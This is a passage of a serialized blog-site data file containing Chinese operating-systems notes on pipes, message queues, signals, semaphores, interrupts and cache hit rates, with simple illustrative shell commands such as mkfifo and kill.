shell进程通信\n\n上面仅仅解析了使用管道进行父进程和子进程之间的通信，但是在我们 shell里面并不是这样的 在 shel里面执行 A | B命令的时候， A 进程和 B 进程都是 shell 创建出来的⼦进程， A 和 B 之间不存在父子关系，它俩的⽗进程都是 shell。 所以说，在 shell里通过「 | 」匿名管道将多个命令连接在⼀起，实际上也就是创建了多个⼦进程，那么在我们编写 shell 脚本时，能使用1个管道搞定的事情，就不要多用一个管道，这样可以减少创建⼦进程的系统开销。\n\n> 总结： 对于匿名管道，它的通信范围是存在父子关系的进程。因为管道没有实体，也就是没有管道文件，只能通过 fork 来复制父进程 fd文件描述符，来达到通信的目的。\n> \n> 对于命名管道，它可以在不相关的进程间也能相互通信。因为命令管道，提前创建了⼀个类型为管道的设备文件，在进程里只要使用这个设备文件，就可以相互通信。 不管是匿名管道还是命名管道，进程写入的数据都是缓存在内核中，另⼀个进程读取数据时候自然也是从内核中获取，同时通信数据都遵循先进先出原则，不支持 lseek 之类的⽂件定位操作。',normalizedContent:'# 匿名管道\n\n如果你学过 linux 命令，那你肯定很熟悉「 | 」这个竖线。\n\n$ ps -ef | grep java\n\n\n1\n\n\n上⾯命令⾏⾥的「| 」竖线就是⼀个管道，它的功能是将前⼀个命令（ ps -ef ）的输出，作为后⼀个命令（ grep java ）的输⼊，从这功能描述，可以看出管道传输数据是单向的，如果想相互通信，我们需要创建两个管道。 同时，我们得知上⾯这种管道是没有名字，所以「 | 」表示的管道称为匿名管道，⽤完了就销毁。\n\n\n# 命名管道\n\n管道还有另外⼀个类型是命名管道，也被叫做 fifo ，因为数据是先进先出的传输⽅式。 在使⽤命名管道前，先需要通过 mkfifo 命令来创建，并且指定管道名字：\n\n$ mkfifo mypipe\n\n\n1\n\n\nmypipe 就是这个管道的名称，基于 linux ⼀切皆⽂件的理念，所以管道也是以⽂件的⽅式存在，我们可以⽤ ls 看⼀下，这个⽂件的类型是 p，也就是 pipe（管道） 的意思：\n\n$ ls -l\nprw-r--r--. 1 root root 0 jul 17 02:45 mypipe\n\n\n1\n2\n\n\n接下来，我们往 mypipe 这个管道写⼊数据：\n\n$ echo "hello" > mypipe // 将数据写进管道\n// 停住了 ...\n\n\n1\n2\n\n\n操作了后，你会发现命令执⾏后就停在这了，这是因为管道⾥的内容没有被读取，只有当管道⾥的数据被读完后，命令才可以正常退出。\n\n于是，我们执行另外⼀个命令来读取这个管道⾥的数据：\n\n$ cat < mypipe // 读取管道⾥的数据\nhello\n\n\n1\n2\n\n\n可以看到，管道⾥的内容被读取出来了，并打印在了终端上，另外⼀⽅⾯， echo 那个命令也正常退出了。\n\n我们可以看出， 管道这种通信方式效率低，不适合进程间频繁地交换数据。当然，它的好处，⾃然就是简单，同时也我们很容易得知管道⾥的数据已经被另⼀个进程读取了。\n\n\n# 背后原理\n\n\n# 父子进程通信\n\n匿名管道的创建，需要通过这个系统调⽤： int pipe(int fd[2]) 这⾥表示创建⼀个匿名管道，并返回了两个描述符，⼀个是管道的读取端描述符fd[0] ，另⼀个是管道的写入端描述符 fd[1] 。注意，这个匿名管道是特殊的⽂件，只存在于内存，不存于⽂件系统中。 其实， 所谓的管道，就是内核里面的一串缓存。从管道的⼀段写入的数据，实际上是缓存在内核中的，另⼀端读取，也就是从内核中读取这段数据。另外，管道传输的数据是⽆格式的流且大小受限。\n\n这两个描述符都是在⼀个进程⾥⾯，并没有起到进程间通信的作⽤，怎么样才能使得管道是跨过两个进程的呢？ 我们可以使用 fork 创建子进程， 创建的子进程会复制父进程的文件描述符，这样就做到了两个进程各有两个 fd[0] 与 fd[1]，两个进程就可以通过各自的 fd 写⼊和读取同一个管道文件实现跨进程通信了。 管道只能⼀端写⼊，另⼀端读出，所以上⾯这种模式容易造成混乱，因为⽗进程和⼦进程都可以同时写入，也都可以读出。那么，为了避免这种情况，通常的做法是：\n\n * ⽗进程关闭读取的 fd[0]，只保留写⼊的fd[1]\n * ⼦进程关闭写⼊的 fd[1]，只保留读取的fd[0] 所以说如果需要双向通信，则应该创建两个管道。\n\n\n# shell进程通信\n\n上面仅仅解析了使用管道进行父进程和子进程之间的通信，但是在我们 shell里面并不是这样的 在 shel里面执行 a | b命令的时候， a 进程和 b 进程都是 shell 创建出来的⼦进程， a 和 b 之间不存在父子关系，它俩的⽗进程都是 shell。 所以说，在 shell里通过「 | 」匿名管道将多个命令连接在⼀起，实际上也就是创建了多个⼦进程，那么在我们编写 shell 脚本时，能使用1个管道搞定的事情，就不要多用一个管道，这样可以减少创建⼦进程的系统开销。\n\n> 总结： 对于匿名管道，它的通信范围是存在父子关系的进程。因为管道没有实体，也就是没有管道文件，只能通过 fork 来复制父进程 fd文件描述符，来达到通信的目的。\n> \n> 对于命名管道，它可以在不相关的进程间也能相互通信。因为命令管道，提前创建了⼀个类型为管道的设备文件，在进程里只要使用这个设备文件，就可以相互通信。 不管是匿名管道还是命名管道，进程写入的数据都是缓存在内核中，另⼀个进程读取数据时候自然也是从内核中获取，同时通信数据都遵循先进先出原则，不支持 lseek 之类的⽂件定位操作。',charsets:{cjk:!0},lastUpdated:"2022/05/31, 15:02:31",lastUpdatedTimestamp:1653980551e3},{title:"进程通信：消息队列",frontmatter:{title:"进程通信：消息队列",date:"2022-04-17T23:56:30.000Z",permalink:"/pages/c35b74/",categories:["操作系统","进程和线程"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/05.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/01.%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B/03.%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1%EF%BC%9A%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.html",relativePath:"05.操作系统/01.进程和线程/03.进程通信：消息队列.md",key:"v-1c05945a",path:"/pages/c35b74/",headersStr:null,content:"⽐如， A 进程要给 B 进程发送消息， A 进程把数据放在对应的消息队列后就可以正常返回了， B 进程需要的时候再去读取数据就可以了。同理， B 进程要给 A 进程发送消息也是如此。\n\n消息队列是保存在内核中的消息链表，在发送数据时，会分成⼀个⼀个独⽴的数据单元，也就是消息体（数据块），消息体是用户自定义的数据类型，消息的发送⽅和接收⽅要约定好消息体的数据类型，所以每个消息体都是固定大小的存储块，不像管道是无格式的字节流数据。如果进程从消息队列中读取了消息体，内核就会把这个消息体删除。\n\n消息队列生命周期随内核，如果没有释放消息队列或者没有关闭操作系统，消息队列会⼀直存在，而前面提到的匿名管道的生命周期，是随进程的创建而建立，随进程的结束而销毁。\n\n\n# 消息队列的缺点\n\n 1. 通信不及时\n 2. 附件也有大小限制 消息队列不适合大数据的传输，因为在内核中每个消息体都有⼀个最⼤长度的限制，同时所有队列所包含的全部消息体的总长度也是有上限。在 Linux 内核中，会有两个宏定义 MSGMAX 和 MSGMNB ，它们以字节为单位，分别定义了⼀条消息的最大长度和⼀个队列的最大长度。\n 3. 消息队列通信过程中，存在用户态与内核态之间的数据复制开销，因为进程写⼊数据到内核中的消息队列时，会发生从⽤户态复制数据到内核态的过程，同理另⼀进程读取内核中的消息数据时，会发生从内核态复制数据到用户态的过程",normalizedContent:"⽐如， a 进程要给 b 进程发送消息， a 进程把数据放在对应的消息队列后就可以正常返回了， b 进程需要的时候再去读取数据就可以了。同理， b 进程要给 a 进程发送消息也是如此。\n\n消息队列是保存在内核中的消息链表，在发送数据时，会分成⼀个⼀个独⽴的数据单元，也就是消息体（数据块），消息体是用户自定义的数据类型，消息的发送⽅和接收⽅要约定好消息体的数据类型，所以每个消息体都是固定大小的存储块，不像管道是无格式的字节流数据。如果进程从消息队列中读取了消息体，内核就会把这个消息体删除。\n\n消息队列生命周期随内核，如果没有释放消息队列或者没有关闭操作系统，消息队列会⼀直存在，而前面提到的匿名管道的生命周期，是随进程的创建而建立，随进程的结束而销毁。\n\n\n# 消息队列的缺点\n\n 1. 通信不及时\n 2. 附件也有大小限制 消息队列不适合大数据的传输，因为在内核中每个消息体都有⼀个最⼤长度的限制，同时所有队列所包含的全部消息体的总长度也是有上限。在 linux 内核中，会有两个宏定义 msgmax 和 msgmnb ，它们以字节为单位，分别定义了⼀条消息的最大长度和⼀个队列的最大长度。\n 3. 消息队列通信过程中，存在用户态与内核态之间的数据复制开销，因为进程写⼊数据到内核中的消息队列时，会发生从⽤户态复制数据到内核态的过程，同理另⼀进程读取内核中的消息数据时，会发生从内核态复制数据到用户态的过程",charsets:{cjk:!0},lastUpdated:"2022/05/31, 15:02:31",lastUpdatedTimestamp:1653980551e3},{title:"进程通信：信号",frontmatter:{title:"进程通信：信号",date:"2022-04-17T23:56:30.000Z",permalink:"/pages/898735/",categories:["操作系统","进程和线程"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/05.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/01.%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B/04.%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1%EF%BC%9A%E4%BF%A1%E5%8F%B7.html",relativePath:"05.操作系统/01.进程和线程/04.进程通信：信号.md",key:"v-9a10594c",path:"/pages/898735/",headersStr:null,content:"上⾯说的进程间通信，都是常规状态下的⼯作模式。 对于异常情况下的⼯作模式，就需要⽤「信号」的⽅式来通知进程。\n\n信号跟信号量虽然名字相似度 66.66%，但两者⽤途完全不⼀样。\n\n在 Linux 操作系统中， 为了响应各种各样的事件，提供了几十种信号，分别代表不同的意义。我们可以通 过 kill -l 命令，查看所有的信号： 运⾏在 shell 终端的进程，我们可以通过键盘输⼊某些组合键的时候，给进程发送信号。例如\n\n * Ctrl+C 产⽣ SIGINT 信号，表示终⽌该进程；\n * Ctrl+Z 产⽣ SIGTSTP 信号，表示停⽌该进程，但还未结束；\n\n如果进程在后台运⾏，可以通过 kill 命令的⽅式给进程发送信号，但前提需要知道运⾏中的进程 PID号，例如：\n\n * kill -9 1050 ，表示给 PID 为 1050 的进程发送 SIGKILL 信号，⽤来⽴即结束该进程； 所以，信号事件的来源主要有硬件来源（如键盘 Cltr+C ）和软件来源（如 kill 命令）。 信号是进程间通信机制中唯⼀的异步通信机制，因为可以在任何时候发送信号给某⼀进程，⼀旦有信号产⽣，我们就有下⾯这⼏种，⽤户进程对信号的处理⽅式。\n\n 1. 执⾏默认操作。 Linux 对每种信号都规定了默认操作，例如，上⾯列表中的 SIGTERM 信号，就是终⽌进程的意思。\n 2. 捕捉信号。我们可以为信号定义⼀个信号处理函数。当信号发⽣时，我们就执⾏相应的信号处理函数。\n 3. 忽略信号。当我们不希望处理某些信号的时候，就可以忽略该信号，不做任何处理。有两个信号是应⽤进程⽆法捕捉和忽略的，即 SIGKILL 和 SEGSTOP ，它们⽤于在任何时候中断或结束某⼀进程。",normalizedContent:"上⾯说的进程间通信，都是常规状态下的⼯作模式。 对于异常情况下的⼯作模式，就需要⽤「信号」的⽅式来通知进程。\n\n信号跟信号量虽然名字相似度 66.66%，但两者⽤途完全不⼀样。\n\n在 linux 操作系统中， 为了响应各种各样的事件，提供了几十种信号，分别代表不同的意义。我们可以通 过 kill -l 命令，查看所有的信号： 运⾏在 shell 终端的进程，我们可以通过键盘输⼊某些组合键的时候，给进程发送信号。例如\n\n * ctrl+c 产⽣ sigint 信号，表示终⽌该进程；\n * ctrl+z 产⽣ sigtstp 信号，表示停⽌该进程，但还未结束；\n\n如果进程在后台运⾏，可以通过 kill 命令的⽅式给进程发送信号，但前提需要知道运⾏中的进程 pid号，例如：\n\n * kill -9 1050 ，表示给 pid 为 1050 的进程发送 sigkill 信号，⽤来⽴即结束该进程； 所以，信号事件的来源主要有硬件来源（如键盘 cltr+c ）和软件来源（如 kill 命令）。 信号是进程间通信机制中唯⼀的异步通信机制，因为可以在任何时候发送信号给某⼀进程，⼀旦有信号产⽣，我们就有下⾯这⼏种，⽤户进程对信号的处理⽅式。\n\n 1. 执⾏默认操作。 linux 对每种信号都规定了默认操作，例如，上⾯列表中的 sigterm 信号，就是终⽌进程的意思。\n 2. 捕捉信号。我们可以为信号定义⼀个信号处理函数。当信号发⽣时，我们就执⾏相应的信号处理函数。\n 3. 忽略信号。当我们不希望处理某些信号的时候，就可以忽略该信号，不做任何处理。有两个信号是应⽤进程⽆法捕捉和忽略的，即 sigkill 和 segstop ，它们⽤于在任何时候中断或结束某⼀进程。",charsets:{cjk:!0},lastUpdated:"2022/05/31, 15:02:31",lastUpdatedTimestamp:1653980551e3},{title:"进程通信：信号量",frontmatter:{title:"进程通信：信号量",date:"2022-04-17T23:56:30.000Z",permalink:"/pages/5a77b2/",categories:["操作系统","进程和线程"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/05.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/01.%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B/05.%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1%EF%BC%9A%E4%BF%A1%E5%8F%B7%E9%87%8F.html",relativePath:"05.操作系统/01.进程和线程/05.进程通信：信号量.md",key:"v-b7cc9f32",path:"/pages/5a77b2/",headersStr:null,content:"⽤了共享内存通信⽅式，带来新的问题，那就是如果多个进程同时修改同⼀个共享内存，很有可能就冲突了。例如两个进程都同时写⼀个地址，那先写的那个进程会发现内容被别⼈覆盖了。\n\n为了防⽌多进程竞争共享资源，⽽造成的数据错乱，所以需要保护机制，使得共享的资源，在任意时刻只能被⼀个进程访问。正好， 信号量就实现了这⼀保护机制。\n\n信号量其实是⼀个整型的计数器，主要用于实现进程间的互斥与同步，而不是用于缓存进程间通信的数据。\n\n信号量表示资源的数量，控制信号量的⽅式有两种原⼦操作：\n\n * ⼀个是 P 操作，这个操作会把信号量减去 1，相减后如果信号量 < 0，则表明资源已被占⽤，进程需阻塞等待；相减后如果信号量 >= 0，则表明还有资源可使⽤，进程可正常继续执⾏。\n * 另⼀个是 V 操作，这个操作会把信号量加上 1，相加后如果信号量 <= 0，则表明当前有阻塞中的进程，于是会将该进程唤醒运⾏；相加后如果信号量 > 0，则表明当前没有阻塞中的进程；\n\nP 操作是⽤在进⼊共享资源之前， V 操作是⽤在离开共享资源之后，这两个操作是必须成对出现的。 接下来，举个例⼦，如果要使得两个进程互斥访问共享内存，我们可以初始化信号量为 1 。\n\n\n\n具体的过程如下：\n\n 1. 进程 A 在访问共享内存前，先执⾏了 P 操作，由于信号量的初始值为 1,故在进程 A 执⾏ P 操作后信号量变为 0，表示共享资源可⽤，于是进程 A 就可以访问共享内存。\n 2. 若此时，进程 B 也想访问共享内存，执⾏了 P 操作，结果信号量变为了 -1，这就意味着临界资源已被占⽤，因此进程 B 被阻塞。\n 3. 直到进程 A 访问完共享内存，才会执⾏ V 操作，使得信号量恢复为0，接着就会唤醒阻塞中的线程B，使得进程 B 可以访问共享内存，最后完成共享内存的访问后，执⾏ V 操作，使信号量恢复到初始值 1。\n\n可以发现，信号初始化为 1 ，就代表着是互斥信号量，它可以保证共享内存在任何时刻只有⼀个进程在访问，这就很好的保护了共享内存。\n\n另外，在多进程⾥，每个进程并不⼀定是顺序执⾏的，它们基本是以各⾃独⽴的、不可预知的速度向前推进，但有时候我们⼜希望多个进程能密切合作，以实现⼀个共同的任务。\n\n例如，进程 A 是负责⽣产数据，⽽进程 B 是负责读取数据，这两个进程是相互合作、相互依赖的，进程 A必须先⽣产了数据，进程 B 才能读取到数据，所以执⾏是有前后顺序的。\n\n那么这时候，就可以⽤信号量来实现多进程同步的⽅式，我们可以初始化信号量为 0 。\n\n\n\n具体过程：\n\n 1. 如果进程 B ⽐进程 A 先执⾏了，那么执⾏到 P 操作时，由于信号量初始值为 0，故信号量会变为-1，表示进程 A 还没⽣产数据，于是进程 B 就阻塞等待；\n 2. 接着，当进程 A ⽣产完数据后，执⾏了 V 操作，就会使得信号量变为 0，于是就会唤醒阻塞在 P 操作的进程 B\n 3. 最后，进程 B 被唤醒后，意味着进程 A 已经⽣产了数据，于是进程 B 就可以正常读取数据了。 可以发现，信号初始化为 0 ，就代表着是同步信号量，它可以保证进程 A 应在进程 B 之前执⾏。",normalizedContent:"⽤了共享内存通信⽅式，带来新的问题，那就是如果多个进程同时修改同⼀个共享内存，很有可能就冲突了。例如两个进程都同时写⼀个地址，那先写的那个进程会发现内容被别⼈覆盖了。\n\n为了防⽌多进程竞争共享资源，⽽造成的数据错乱，所以需要保护机制，使得共享的资源，在任意时刻只能被⼀个进程访问。正好， 信号量就实现了这⼀保护机制。\n\n信号量其实是⼀个整型的计数器，主要用于实现进程间的互斥与同步，而不是用于缓存进程间通信的数据。\n\n信号量表示资源的数量，控制信号量的⽅式有两种原⼦操作：\n\n * ⼀个是 p 操作，这个操作会把信号量减去 1，相减后如果信号量 < 0，则表明资源已被占⽤，进程需阻塞等待；相减后如果信号量 >= 0，则表明还有资源可使⽤，进程可正常继续执⾏。\n * 另⼀个是 v 操作，这个操作会把信号量加上 1，相加后如果信号量 <= 0，则表明当前有阻塞中的进程，于是会将该进程唤醒运⾏；相加后如果信号量 > 0，则表明当前没有阻塞中的进程；\n\np 操作是⽤在进⼊共享资源之前， v 操作是⽤在离开共享资源之后，这两个操作是必须成对出现的。 接下来，举个例⼦，如果要使得两个进程互斥访问共享内存，我们可以初始化信号量为 1 。\n\n\n\n具体的过程如下：\n\n 1. 进程 a 在访问共享内存前，先执⾏了 p 操作，由于信号量的初始值为 1,故在进程 a 执⾏ p 操作后信号量变为 0，表示共享资源可⽤，于是进程 a 就可以访问共享内存。\n 2. 若此时，进程 b 也想访问共享内存，执⾏了 p 操作，结果信号量变为了 -1，这就意味着临界资源已被占⽤，因此进程 b 被阻塞。\n 3. 直到进程 a 访问完共享内存，才会执⾏ v 操作，使得信号量恢复为0，接着就会唤醒阻塞中的线程b，使得进程 b 可以访问共享内存，最后完成共享内存的访问后，执⾏ v 操作，使信号量恢复到初始值 1。\n\n可以发现，信号初始化为 1 ，就代表着是互斥信号量，它可以保证共享内存在任何时刻只有⼀个进程在访问，这就很好的保护了共享内存。\n\n另外，在多进程⾥，每个进程并不⼀定是顺序执⾏的，它们基本是以各⾃独⽴的、不可预知的速度向前推进，但有时候我们⼜希望多个进程能密切合作，以实现⼀个共同的任务。\n\n例如，进程 a 是负责⽣产数据，⽽进程 b 是负责读取数据，这两个进程是相互合作、相互依赖的，进程 a必须先⽣产了数据，进程 b 才能读取到数据，所以执⾏是有前后顺序的。\n\n那么这时候，就可以⽤信号量来实现多进程同步的⽅式，我们可以初始化信号量为 0 。\n\n\n\n具体过程：\n\n 1. 如果进程 b ⽐进程 a 先执⾏了，那么执⾏到 p 操作时，由于信号量初始值为 0，故信号量会变为-1，表示进程 a 还没⽣产数据，于是进程 b 就阻塞等待；\n 2. 接着，当进程 a ⽣产完数据后，执⾏了 v 操作，就会使得信号量变为 0，于是就会唤醒阻塞在 p 操作的进程 b\n 3. 最后，进程 b 被唤醒后，意味着进程 a 已经⽣产了数据，于是进程 b 就可以正常读取数据了。 可以发现，信号初始化为 0 ，就代表着是同步信号量，它可以保证进程 a 应在进程 b 之前执⾏。",charsets:{cjk:!0},lastUpdated:"2022/05/31, 15:02:31",lastUpdatedTimestamp:1653980551e3},{title:"操作系统原理：进程同步的几种方式及基本原理",frontmatter:{title:"操作系统原理：进程同步的几种方式及基本原理",date:"2022-04-17T23:56:30.000Z",permalink:"/pages/c0d765/",categories:["操作系统"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/05.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/02.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%EF%BC%9A%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%E5%8F%8A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86.html",relativePath:"05.操作系统/02.操作系统原理：进程同步的几种方式及基本原理.md",key:"v-24eb5e45",path:"/pages/c0d765/",headersStr:null,content:"1、信号量\n\n用于进程间传递信号的一个整数值。在信号量上只有三种操作可以进行：初始化，P操作和V操作，这三种操作都是原子操作。\n\nP操作(递减操作)可以用于阻塞一个进程，V操作(增加操作)可以用于解除阻塞一个进程。\n\n基本原理是两个或多个进程可以通过简单的信号进行合作，一个进程可以被迫在某一位置停止，直到它接收到一个特定的信号。该信号即为信号量s。\n\n为通过信号量s传送信号，进程可执行原语semSignal(s);为通过信号量s接收信号，进程可执行原语semWait(s);如果相应的信号仍然没有发送，则进程会被阻塞，直到发送完为止。\n\n可把信号量视为一个具有整数值的变量，在它之上定义三个操作：\n\n * 一个信号量可以初始化为非负数\n * semWait操作使信号量s减1.若值为负数，则执行semWait的进程被阻塞。否则进程继续执行。\n * semSignal操作使信号量加1，若值大于或等于零，则被semWait操作阻塞的进程被解除阻塞。\n\n2、管程\n\n管程是由一个或多个过程、一个初始化序列和局部数据组成的软件模块，其主要特点如下：\n\n * 局部数据变量只能被管程的过程访问，任何外部过程都不能访问。\n * 一个进程通过调用管程的一个过程进入管程。\n * 在任何时候，只能有一个进程在管程中执行，调用管程的任何其他进程都被阻塞，以等待管程可用。\n\n管程通过使用条件变量提供对同步的支持，这些条件变量包含在管程中，并且只有在管程中才能被访问。有两个函数可以操作条件变量：\n\n * cwait(c)：调用进程的执行在条件c上阻塞，管程现在可被另一个进程使用。\n * csignal(c)：恢复执行在cwait之后因为某些条件而阻塞的进程。如果有多个这样的进程，选择其中一个；如果没有这样的进程，什么以不做。\n\n3、消息传递\n\n消息传递的实际功能以一对原语的形式提供：\n\n * send(destination,message)\n * receive(source,message)\n\n这是进程间进程消息传递所需要的最小操作集。\n\n一个进程以消息的形式给另一个指定的目标进程发送消息；\n\n进程通过执行receive原语接收消息，receive原语中指明发送消息的源进程和消息。",normalizedContent:"1、信号量\n\n用于进程间传递信号的一个整数值。在信号量上只有三种操作可以进行：初始化，p操作和v操作，这三种操作都是原子操作。\n\np操作(递减操作)可以用于阻塞一个进程，v操作(增加操作)可以用于解除阻塞一个进程。\n\n基本原理是两个或多个进程可以通过简单的信号进行合作，一个进程可以被迫在某一位置停止，直到它接收到一个特定的信号。该信号即为信号量s。\n\n为通过信号量s传送信号，进程可执行原语semsignal(s);为通过信号量s接收信号，进程可执行原语semwait(s);如果相应的信号仍然没有发送，则进程会被阻塞，直到发送完为止。\n\n可把信号量视为一个具有整数值的变量，在它之上定义三个操作：\n\n * 一个信号量可以初始化为非负数\n * semwait操作使信号量s减1.若值为负数，则执行semwait的进程被阻塞。否则进程继续执行。\n * semsignal操作使信号量加1，若值大于或等于零，则被semwait操作阻塞的进程被解除阻塞。\n\n2、管程\n\n管程是由一个或多个过程、一个初始化序列和局部数据组成的软件模块，其主要特点如下：\n\n * 局部数据变量只能被管程的过程访问，任何外部过程都不能访问。\n * 一个进程通过调用管程的一个过程进入管程。\n * 在任何时候，只能有一个进程在管程中执行，调用管程的任何其他进程都被阻塞，以等待管程可用。\n\n管程通过使用条件变量提供对同步的支持，这些条件变量包含在管程中，并且只有在管程中才能被访问。有两个函数可以操作条件变量：\n\n * cwait(c)：调用进程的执行在条件c上阻塞，管程现在可被另一个进程使用。\n * csignal(c)：恢复执行在cwait之后因为某些条件而阻塞的进程。如果有多个这样的进程，选择其中一个；如果没有这样的进程，什么以不做。\n\n3、消息传递\n\n消息传递的实际功能以一对原语的形式提供：\n\n * send(destination,message)\n * receive(source,message)\n\n这是进程间进程消息传递所需要的最小操作集。\n\n一个进程以消息的形式给另一个指定的目标进程发送消息；\n\n进程通过执行receive原语接收消息，receive原语中指明发送消息的源进程和消息。",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"软中断和硬中断",frontmatter:{title:"软中断和硬中断",date:"2022-04-17T23:56:30.000Z",permalink:"/pages/71dc3f/",categories:["操作系统"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/05.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/03.%E8%BD%AF%E4%B8%AD%E6%96%AD%E5%92%8C%E7%A1%AC%E4%B8%AD%E6%96%AD.html",relativePath:"05.操作系统/03.软中断和硬中断.md",key:"v-f06f01c4",path:"/pages/71dc3f/",headersStr:null,content:"那 Linux 系统为了解决中断处理程序执⾏过⻓和中断丢失的问题，将中断过程分成了两个阶段。\n\n * 上半部⽤来快速处理中断，⼀般会暂时关闭中断请求，主要负责处理跟硬件紧密相关或者时间敏感的事情。\n * 下半部⽤来延迟处理上半部未完成的⼯作，⼀般以「内核线程」的⽅式运⾏。\n\n> 外卖例⼦，由于第⼀个配送员⻓时间跟我通话，则导致第⼆位配送员⽆法拨通我的电话，其实当我接到第⼀位配送员的电话，可以告诉配送员说我现在下楼，剩下的事情，等我们⻅⾯再说（上半部），然后就可以挂断电话，到楼下后，在拿外卖，以及跟配送员说其他的事情（下半部）。这样，第⼀位配送员就不会占⽤我⼿机太多时间，当第⼆位配送员正好过来时，会有很⼤⼏率拨通我的电话。\n\n> ⼀个计算机中的例⼦，常⻅的⽹卡接收⽹络包的例⼦。 ⽹卡收到⽹络包后，会通过硬件中断通知内核有新的数据到了，于是内核就会调⽤对应的中断处理程序来响应该事件，这个事件的处理也是会分成上半部和下半部。 上部分要做到快速处理，所以只要把⽹卡的数据读到内存中，然后更新⼀下硬件寄存器的状态，⽐如把状态更新为表示数据已经读到内存中的状态值。接着，内核会触发⼀个软中断，把⼀些处理⽐较耗时且复杂的事情，交给「软中断处理程序」去做，也就是中断的下半部，其主要是需要从内存中找到⽹络数据，再按照⽹络协议栈，对⽹络数据进⾏逐层解析和处理，最后把数据送给应⽤程序。\n\n中断处理程序的上部分和下半部可以理解为：\n\n * 上半部直接处理硬件请求，也就是硬中断，主要是负责耗时短的⼯作，特点是快速执行；\n * 下半部是由内核触发，也就说软中断，主要是负责上半部未完成的⼯作，通常都是耗时⽐较长的事情，特点是延迟执行；",normalizedContent:"那 linux 系统为了解决中断处理程序执⾏过⻓和中断丢失的问题，将中断过程分成了两个阶段。\n\n * 上半部⽤来快速处理中断，⼀般会暂时关闭中断请求，主要负责处理跟硬件紧密相关或者时间敏感的事情。\n * 下半部⽤来延迟处理上半部未完成的⼯作，⼀般以「内核线程」的⽅式运⾏。\n\n> 外卖例⼦，由于第⼀个配送员⻓时间跟我通话，则导致第⼆位配送员⽆法拨通我的电话，其实当我接到第⼀位配送员的电话，可以告诉配送员说我现在下楼，剩下的事情，等我们⻅⾯再说（上半部），然后就可以挂断电话，到楼下后，在拿外卖，以及跟配送员说其他的事情（下半部）。这样，第⼀位配送员就不会占⽤我⼿机太多时间，当第⼆位配送员正好过来时，会有很⼤⼏率拨通我的电话。\n\n> ⼀个计算机中的例⼦，常⻅的⽹卡接收⽹络包的例⼦。 ⽹卡收到⽹络包后，会通过硬件中断通知内核有新的数据到了，于是内核就会调⽤对应的中断处理程序来响应该事件，这个事件的处理也是会分成上半部和下半部。 上部分要做到快速处理，所以只要把⽹卡的数据读到内存中，然后更新⼀下硬件寄存器的状态，⽐如把状态更新为表示数据已经读到内存中的状态值。接着，内核会触发⼀个软中断，把⼀些处理⽐较耗时且复杂的事情，交给「软中断处理程序」去做，也就是中断的下半部，其主要是需要从内存中找到⽹络数据，再按照⽹络协议栈，对⽹络数据进⾏逐层解析和处理，最后把数据送给应⽤程序。\n\n中断处理程序的上部分和下半部可以理解为：\n\n * 上半部直接处理硬件请求，也就是硬中断，主要是负责耗时短的⼯作，特点是快速执行；\n * 下半部是由内核触发，也就说软中断，主要是负责上半部未完成的⼯作，通常都是耗时⽐较长的事情，特点是延迟执行；",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"提升缓存的命中率",frontmatter:{title:"提升缓存的命中率",date:"2022-04-17T23:56:30.000Z",permalink:"/pages/161e44/",categories:["操作系统"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/05.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/04.%E6%8F%90%E5%8D%87%E7%BC%93%E5%AD%98%E7%9A%84%E5%91%BD%E4%B8%AD%E7%8E%87.html",relativePath:"05.操作系统/04.提升缓存的命中率.md",key:"v-c6405262",path:"/pages/161e44/",headersStr:null,content:"两种循环方式\n\n\n# 提升数据缓存命中率\n\n形式⼀ array[i][j] 执⾏时间⽐形式⼆ array[j][i] 快好⼏倍。\n\n之所以有这么⼤的差距，是因为⼆维数组 array 所占⽤的内存是连续的\n\nCPU 具体会⼀次从内存中加载多少元素到 CPU Cache 呢？ 这个问题，在前⾯我们也提到过，这跟 CPU Cache Line 有关，它表示 CPU Cache ⼀次性能加载数据的⼤⼩，可以在Linux ⾥通过 coherency_line_size 配置查看 它的⼤⼩，通常是 64 个字节。\n\n\n\n按照内存布局顺序访问，将可以有效的利⽤ CPU Cache 带来的好 处，这样我们代码的性能就会得到很⼤的提升\n\n\n# 提升指令缓存命中率\n\n以⼀个例⼦来看看，有⼀个元素为 0 到 100 之间随机数字组成的⼀维数组： 接下来，对这个数组做两个操作：\n\n * 第⼀个操作，循环遍历数组，把⼩于 50 的数组元素置为 0；\n * 第⼆个操作，将数组排序；\n\n那么问题来了，先遍历再排序速度快，还是先排序再遍历速度快呢？\n\nCPU 的分⽀预测器： 对于 if 条件语句，意味着此时⾄少可以选择跳转到两段不同的指令执⾏，也就是 if 还是 else 中的指令。 那么， 如果分⽀预测可以预测到接下来要执⾏ if ⾥的指令，还是 else 指令的话，就可以「提前」把这些指令放在指令缓存中，这样 